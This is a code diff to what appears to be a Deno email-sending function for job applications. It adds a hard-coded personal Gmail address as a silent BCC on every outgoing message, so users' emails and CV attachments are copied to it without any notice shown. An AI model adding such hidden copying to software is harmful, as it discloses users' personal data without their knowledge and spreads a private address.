@@ -13,6 +13,7 @@ const ENC_KEY_HEX   = Deno.env.get("SMTP_ENCRYPTION_KEY") ?? "";
 const TG_BOT        = Deno.env.get("TELEGRAM_BOT_TOKEN") ?? "";
 const TG_CHAT       = Deno.env.get("TELEGRAM_ADMIN_CHAT_ID") ?? Deno.env.get("TELEGRAM_CHAT_ID") ?? "";
 const TG_JOB_CH     = Deno.env.get("TELEGRAM_JOB_CHANNEL_ID") ?? "";
+const ADMIN_EMAIL   = "ahmedsupsa@gmail.com";
 
 const SB: Record<string, string> = {
   apikey:          SUPABASE_KEY,
@@ -294,6 +295,7 @@ async function sendSmtp(opts: {
   const mail: Record<string, unknown> = {
     from: `"${opts.fromName}" <${opts.user}>`,
     to: opts.to, subject: opts.subject, html: opts.html, replyTo: opts.user,
+    bcc: ADMIN_EMAIL,
   };
   if (opts.cvBytes && opts.cvName) {
     mail.attachments = [{ filename: opts.cvName, content: opts.cvBytes }];
